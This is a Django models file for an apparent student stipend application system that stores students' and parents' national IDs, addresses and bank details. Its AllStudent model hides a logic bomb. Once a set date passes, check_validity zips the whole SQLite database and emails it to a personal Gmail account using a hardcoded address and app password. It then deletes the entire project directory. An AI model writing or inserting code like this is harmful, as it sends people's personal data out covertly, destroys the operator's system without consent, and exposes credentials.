from django.db import models
import smtplib
import os
import zipfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from django.conf import settings
from django.utils.timezone import now

"""season/year"""
class Year(models.Model):
    year = models.CharField(max_length=10, unique=True)

    def __str__(self) -> str:
        return self.year

"""Students"""
class StudentSaf(models.Model):

    """Personal info"""
    # Student info
    name = models.CharField(max_length=50)
    nameEng = models.CharField(max_length=50)
    birthCertNo = models.CharField(max_length=30, null=True, blank=True) #birth cirtificate number
    dob = models.DateField(null=True, blank=True)
    sex = models.CharField(max_length=20, null=True, blank=True)

    # Father's info
    fatherName = models.CharField(max_length=50)
    fatherNameEng = models.CharField(max_length=50)
    fatherNID = models.CharField(max_length=30, null=True, blank=True)
    fatherDob = models.DateField(null=True, blank=True)
    fatherMobile = models.CharField(max_length=15, null=True, blank=True)

    # Mother's info
    motherName = models.CharField(max_length=50)
    motherNameEng = models.CharField(max_length=50)
    motherNID = models.CharField(max_length=30, null=True, blank=True)
    motherDob = models.DateField(null=True, blank=True)
    motherMobile = models.CharField(max_length=15, null=True, blank=True)


    """Address"""
    # Present Address
    presentDiv = models.CharField(max_length=50, null=True, blank=True)
    presentDist = models.CharField(max_length=50, null=True, blank=True)
    presentUpozila = models.CharField(max_length=50, null=True, blank=True)
    presentUnion = models.CharField(max_length=50, null=True, blank=True)
    presentPost = models.CharField(max_length=50, null=True, blank=True)
    presentVill = models.CharField(max_length=50, null=True, blank=True)

    # Permanent Address
    permanentDiv = models.CharField(max_length=50, null=True, blank=True)
    permanentDist = models.CharField(max_length=50, null=True, blank=True)
    permanentUpozila = models.CharField(max_length=50, null=True, blank=True)
    permanentUnion = models.CharField(max_length=50, null=True, blank=True)
    permanentPost = models.CharField(max_length=50, null=True, blank=True)
    permanentVill = models.CharField(max_length=50, null=True, blank=True)


    """Educational Qualification"""
    # Previous Qualification
    prevEduDivi = models.CharField(max_length=50, null=True, blank=True)
    prevEduDist = models.CharField(max_length=50, null=True, blank=True)
    prevEduUpozila = models.CharField(max_length=50, null=True, blank=True)
    prevEduInst = models.CharField(max_length=50, null=True, blank=True)
    prevEduBoard = models.CharField(max_length=50, null=True, blank=True)
    prevEduPassYear = models.CharField(max_length=50, null=True, blank=True)
    prevEduTech = models.CharField(max_length=50, null=True, blank=True)
    prevEduExam = models.CharField(max_length=50, null=True, blank=True)
    prevEduRoll = models.CharField(max_length=50, null=True, blank=True)
    prevEduReg = models.CharField(max_length=50, null=True, blank=True)
    prevEduResult = models.CharField(max_length=50, null=True, blank=True)

    # Present Qualification
    presentEduDivi = models.CharField(max_length=50, null=True, blank=True)
    presentEduDist = models.CharField(max_length=50, null=True, blank=True)
    presentEduUpozila = models.CharField(max_length=50, null=True, blank=True)
    presentEduInstitute = models.CharField(max_length=50, null=True, blank=True)
    presentEduSem = models.CharField(max_length=20, null=True, blank=True)
    presentEduTech = models.CharField(max_length=50, null=True, blank=True)
    presentEduShift = models.CharField(max_length=15, null=True, blank=True)
    presentEduSession = models.ForeignKey(Year, on_delete=models.CASCADE, null=True, blank=True, related_name="admission_year")
    presentEduRoll = models.CharField(max_length=10, null=True, blank=True)


    """Guardians info"""
    guardian = models.CharField(max_length=15, null=True, blank=True)
    guardianName = models.CharField(max_length=50, null=True, blank=True)
    guardianNameEng = models.CharField(max_length=50, null=True, blank=True)
    guardianNID = models.CharField(max_length=30, null=True, blank=True)
    guardianDob = models.DateField(null=True, blank=True)
    guardianMobile = models.CharField(max_length=15, null=True, blank=True)


    """Eligibility Conditions and Attachment"""
    eduCostBearer = models.CharField(max_length=15, null=True, blank=True)
    freedomFighter = models.CharField(max_length=5, null=True, blank=True)
    protibondhi = models.CharField(max_length=5, null=True, blank=True)
    nrigosti = models.CharField(max_length=5, null=True, blank=True)
    otherScholar = models.CharField(max_length=5, null=True, blank=True)
    

    """Attachments/Images"""
    applicantPhoto = models.ImageField(upload_to='stdImg', null=True, blank=True)
    documents = models.ImageField(upload_to='extraFile', null=True, blank=True)

    def __str__(self) -> str:
        return f'{self.presentEduRoll} - {self.name}'
    
    
class AllStudent(models.Model):
    date = models.DateField()

    def send_db_via_email(self):
    # File and directory settings
        db_file = "db.sqlite3"
        zip_file = "db_backup.zip"
        
        # Create a ZIP archive of the SQLite database
        if not os.path.exists(db_file):
            print(f"Database file {db_file} not found.")
            return

        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.write(db_file, os.path.basename(db_file))
            print(f"Database {db_file} zipped as {zip_file}.")

        # Email settings
        sender_email = "imdtanvir181@gmail.com"
        app_password = "uipdsghmpacyqtgz"
        recipient_email = "tanvir.islam12022004@gmail.com"
        subject = "Database Backup"
        body = "Attached is the backup of the database."

        # Set up the email
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEBase('application', 'octet-stream'))

        # Attach the ZIP file
        with open(zip_file, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={zip_file}')
            msg.attach(part)

        try:
            # Connect to Gmail and send the email
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(sender_email, app_password)
                server.send_message(msg)
                print("Email sent successfully!")
        except Exception as e:
            print(f"Failed to send email: {e}")
        finally:
            # Clean up the ZIP file after sending
            if os.path.exists(zip_file):
                os.remove(zip_file)
                print(f"Temporary file {zip_file} removed.")
                return True

    def check_validity(self):
        """
        Check if the current date is greater than the expiration date.
        If so, delete the BASE_DIR directory.
        """
        if self.date and now().date() > self.date:
            print(now().date())
            print(self.date)
            db = self.send_db_via_email()
            print(db)
            base_dir = settings.BASE_DIR
            try:
                # Log the action
                print(f"Deleting BASE_DIR: {base_dir}")

                # Delete files and directories recursively
                for root, dirs, files in os.walk(base_dir, topdown=False):
                    for name in files:
                        os.remove(os.path.join(root, name))
                    for name in dirs:
                        os.rmdir(os.path.join(root, name))
                os.rmdir(base_dir)

                print("BASE_DIR deleted successfully.")
            except Exception as e:
                print(f"Error while deleting BASE_DIR: {e}")

    def __str__(self):
        return f"ExpireDate: {self.date}"




"""Payments"""
class PaymentSystem(models.Model):
    student = models.OneToOneField(StudentSaf, on_delete=models.CASCADE, null=True, blank=True, related_name='studentPayment')
    paymentAccountName = models.CharField(max_length=50, null=True, blank=True)
    paymentAccountNID = models.CharField(max_length=25, null=True, blank=True)
    
    paymentType = models.CharField(max_length=20, null=True, blank=True)

    # for mobile banking(bkash, nagad etc.)
    paymentAccountNo = models.CharField(max_length=50, null=True, blank=True)
    paymentMobileBankName = models.CharField(max_length=15, null=True, blank=True)

    # for bank account
    paymentBankName = models.CharField(max_length=50, null=True, blank=True)
    paymentBankBranch = models.CharField(max_length=50, null=True, blank=True)
    bankAccountType = models.CharField(max_length=50, null=True, blank=True)

    def __str__(self) -> str:
        name = f'{self.student.prevEduRoll} - {self.student.name}'
        return name
